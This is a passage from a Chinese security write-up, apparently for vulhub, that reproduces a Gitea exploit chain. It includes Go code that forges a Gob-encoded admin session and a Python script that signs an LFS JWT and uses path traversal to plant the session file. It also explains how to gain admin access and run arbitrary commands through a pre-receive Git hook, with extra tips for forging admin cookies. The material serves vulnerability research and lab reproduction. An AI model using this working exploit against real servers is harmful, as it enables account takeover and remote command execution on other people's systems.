"go-macaron/session源码")：
这里面有几个很重要的点：
  1. session文件名为sid[0]/sid[1]/sid
  2. 对象被用Gob序列化后存入文件
Gob是Go语言独有的序列化方法。我们可以编写一段Go语言程序，来生成一段Gob编码的session：
    package main
    import (
        "fmt"
        "encoding/gob"
        "bytes"
        "encoding/hex"
    )
    func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {
        for _, v := range obj {
            gob.Register(v)
        }
        buf := bytes.NewBuffer(nil)
        err := gob.NewEncoder(buf).Encode(obj)
        return buf.Bytes(), err
    }
    func main() {
        var uid int64 = 1
        obj := map[interface{}]interface{} {"_old_uid": "1", "uid": uid, "uname": "vulhub" }
        data, err := EncodeGob(obj)
        if err != nil {
            fmt.Println(err)
        }
        edata := hex.EncodeToString(data)
        fmt.Println(edata)
    }
其中，`{"_old_iod": "1", "uid": uid, "uname": "vulhub"
}`就是session中的数据，uid是管理员id，uname是管理员用户名。编译并执行上述代码，得到一串hex，就是伪造的数据。
> 原作者给出的POC是他生成好的一段二进制文件，uid和uname不能自定义。
接着，我写了一个简单的Python脚本来进行后续利用（需要Python3.6）：
    import requests
    import jwt
    import time
    import base64
    import logging
    import sys
    import json
    from urllib.parse import quote
    logging.basicConfig(stream=sys.stdout, level=logging.DEBUG)
    BASE_URL = 'http://your-ip:3000/vulhub/repo'
    JWT_SECRET = 'AzDE6jvaOhh_u30cmkbEqmOdl8h34zOyxfqcieuAu9Y'
    USER_ID = 1
    REPO_ID = 1
    SESSION_ID = '11vulhub'
    SESSION_DATA = bytes.fromhex('0eff81040102ff82000110011000005cff82000306737472696e670c0a00085f6f6c645f75696406737472696e670c0300013106737472696e670c05000375696405696e7436340402000206737472696e670c070005756e616d6506737472696e670c08000676756c687562')
    def generate_token():
        def decode_base64(data):
            missing_padding = len(data) % 4
            if missing_padding != 0:
                data += '='* (4 - missing_padding)
            return base64.urlsafe_b64decode(data)
        nbf = int(time.time())-(60*60*24*1000)
        exp = int(time.time())+(60*60*24*1000)
        token = jwt.encode({'user': USER_ID, 'repo': REPO_ID, 'op': 'upload', 'exp': exp, 'nbf': nbf}, decode_base64(JWT_SECRET), algorithm='HS256')
        return token.decode()
    def gen_data():
        yield SESSION_DATA
        time.sleep(300)
        yield b''
    OID = f'....gitea/sessions/{SESSION_ID[0]}/{SESSION_ID[1]}/{SESSION_ID}'
    response = requests.post(f'{BASE_URL}.git/info/lfs/objects', headers={
        'Accept': 'application/vnd.git-lfs+json'
    }, json={
        "Oid": OID,
        "Size": 100000,
        "User" : "a",
        "Password" : "a",
        "Repo" : "a",
        "Authorization" : "a"
    })
    logging.info(response.text)
    response = requests.put(f"{BASE_URL}.git/info/lfs/objects/{quote(OID, safe='')}", data=gen_data(), headers={
        'Accept': 'application/vnd.git-lfs',
        'Content-Type': 'application/vnd.git-lfs',
        'Authorization': f'Bearer {generate_token()}'
     })
这个脚本会将伪造的SESSION数据发送，并等待300秒后才关闭连接。在这300秒中，服务器上将存在一个名为“11vulhub.tmp”的文件，这也是session
id。
带上这个session id，即可提升为管理员。
#### 漏洞六、利用HOOK执行任意命令
带上`i_like_gitea=11vulhub.tmp`这个Cookie，我们即可访问管理员账户。
然后随便找个项目，在设置中配置Git钩子。Git钩子是执行git命令的时候，会被自动执行的一段脚本。比如我这里用的pre-receive钩子，就是在commit之前会执行的脚本。我在其中加入待执行的命令`touch /tmp/success`：
然后在网页端新建一个文件，点提交。进入docker容器，可见命令被成功执行：
#### 一些思考
整个漏洞链非常流畅，Go Web端的代码审计也非常少见，在传统漏洞越来越少的情况下，这些好思路将给安全研究者带来很多不一样的突破。
不过漏洞作者给出的POC实在是比较烂，基本离开了他自己的环境就不能用了，而且我也不建议用一键化的漏洞利用脚本来复现这个漏洞，原因是这个漏洞的利用涉及到一些不确定量，比如：
  1. gitea的$GITEA_CUSTOM，这个值影响到读取app.ini的那段POC
  2. 管理员的用户名和ID，这个可能需要猜。但其实我们也没必要必须伪造管理员的session，我们可以伪造任意一个用户的session，然后进入网站后再找找看看有没有管理员所创建的项目，如果有的话，就可以得知管理员的用户名了。
另外，复现漏洞的时候也遇到过一些坑，比如gitea第一次安装好，如果不重启的话，他的session是存储在内存里的。只有第一次重启后，才会使用文件session，这一点需要注意。
如果目标系统使用的是sqlite做数据库，我们可以直接下载其数据库，并拿到他的密码哈希和另一个随机字符串，利用这两个值其实能直接伪造管理员的cookie（名为gitea_incredible），这一点我就不写了，大家可以自己查看文档。
* * *